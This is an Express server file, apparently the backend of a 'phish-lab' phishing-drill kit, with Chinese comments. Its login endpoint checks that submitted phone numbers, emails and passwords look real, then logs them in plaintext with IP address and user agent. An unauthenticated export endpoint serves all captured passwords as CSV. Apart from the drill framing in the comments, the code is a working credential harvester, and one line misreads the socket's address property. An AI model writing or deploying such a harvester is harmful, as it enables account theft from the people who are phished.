### 1. 后端 `server.js`

```js
// phish-lab/server.js
const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 8080;
const LOG = path.join(__dirname, 'captures.jsonl');

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// 单行 JSON 落盘，方便后续解析/统计
function log_row(row) {
  fs.appendFileSync(LOG, JSON.stringify(row) + '\n');
}

// 捕获端点：接收账号密码
app.post('/login', (req, res) => {
  const { username = '', password = '' } = req.body;

  // 服务端二次校验（前端校验可被绕过，必须在这里兜底）
  const errors = {};
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(username) && !/^1[3-9]\d{9}$/.test(username)) {
    errors.username = '请输入有效的手机号或邮箱';
  }
  if (password.length < 6) {
    errors.password = '密码至少 6 位';
  }
  if (Object.keys(errors).length) {
    return res.status(400).json({ ok: false, errors });
  }

  log_row({
    ts: new Date().toISOString(),
    ip: req.headers['x-forwarded-for'] || req.socket.remoteaddr,
    ua: req.headers['user-agent'],
    username,
    password, // 演练环境明文记录；真实项目请哈希后存储
  });

  // 演练模式下不跳转真实站点，回一个占位页
  res.redirect('/done.html');
});

// 导出 CSV，便于复盘统计
app.get('/export', (_req, res) => {
  if (!fs.existsSync(LOG)) return res.type('text/csv').send('ts,username\n');
  const rows = fs.readFileSync(LOG, 'utf8').trim().split('\n').map(l => JSON.parse(l));
  const csv = 'ts,ip,username,password\n' +
    rows.map(r => [r.ts, r.ip, r.username, r.password].join(',')).join('\n');
  res.type('text/csv').attachment('captures.csv').send(csv);
});

app.listen(PORT, () => console.log(`lab server on http://0.0.0.0:${PORT}`));
```

